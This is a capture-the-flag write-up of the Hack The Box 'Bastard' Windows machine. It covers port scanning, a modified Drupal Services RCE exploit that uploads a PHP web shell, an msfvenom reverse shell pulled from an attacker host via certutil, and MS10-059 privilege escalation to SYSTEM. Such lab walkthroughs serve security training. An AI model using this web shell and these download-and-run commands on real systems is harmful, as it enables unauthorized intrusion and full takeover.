---
title: "HTB Bastard"
permalink: /writeups/bastard
location: default
---

# HTB Bastard

**Machine Information**

	IP : 10.10.10.9
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`. 

```
rustscan -a 10.10.10.9 -- -sC -sV
```

This should reveal three open ports: `80`, `135`, and `49154`.

```
PORT      STATE SERVICE REASON  VERSION
80/tcp    open  http    syn-ack Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
135/tcp   open  msrpc   syn-ack Microsoft Windows RPC
49154/tcp open  msrpc   syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Getting a Foothold

**Drupal Exploit**

The `nmap` output shows that the web server is running `Drupal 7` which can be confirmed using the `CHANGELOG.txt` file.

> http://10.10.10.9/CHANGELOG.txt

Use `searchsploit` to look for exploits for `Drupal 7`.

```
searchsploit drupal 7
```

This will reveal a PHP exploit that results in remote code execution.

```
Drupal 7.x Module Services - Remote Code Execution | php/webapps/41564.php
```

Reviewing the exploit shows it is looking for the `/rest_endpoint` endpoint but trying to visit this page returns a 404 error. After running `dirsearch` though we can see an endpoint at `/rest`.

```
dirsearch -u http://10.10.10.9
```

This can be confirmed by visiting the page in a browser.

> http://10.10.10.9/rest

```
Services Endpoint "rest_endpoint" has been setup successfully.
```

Modify the exploit to use our target IP and endpoint. We want to set the payload to a reverse shell.

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$phpCode = <<<'EOD'
<?php
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.4:8000/" . $_REQUEST['fupload']));
    };
    if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };
?>
EOD;

$file = [
    'filename' => 'shell.php',
    'data' => $phpCode
];
```

Run the exploit to upload a web shell. We can use the web shell to run commands on the target system.

```
http://10.10.10.9/shell.php?fexec=whoami
```

To get a full shell we will create a payload using `msfvenom`.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe > shelly.exe
```

Use our web shell to upload this to our target machine. Start a new `netcat` listener and run the executable.

```
http://10.10.10.9/shell.php?fexec=certutil -urlcache -f http://10.10.14.4/shelly.exe shelly.exe
```

```
http://10.10.10.9/shell.php?fexec=shelly.exe
```

Success!

```
C:\inetpub\drupal-7.54>whoami
nt authority\iusr
```

The user flag can be found in the following directory:

```
C:\Users\dimitris\Desktop\user.txt
```

### Privilege Escalation

Checking `systeminfo` shows that no hotfixes have been applied so the machine is likely vulnerable.

```
Hotfix(s):                 N/A
```

Upload the `Chimichurri.exe` exploit to the target machine. It can be obtained from the following link:

> https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

Transfer it to the target machine and start a new `netcat` listener. Once listening run the exploit to get an elevated shell.

```
.\MS10-059.exe 10.10.14.4 9001
```

Success!

```
C:\temp>whoami
nt authority\system
```

The root flag can be retrieved from the following directory:

```
C:\Users\Administrator\Desktop\root.txt
```
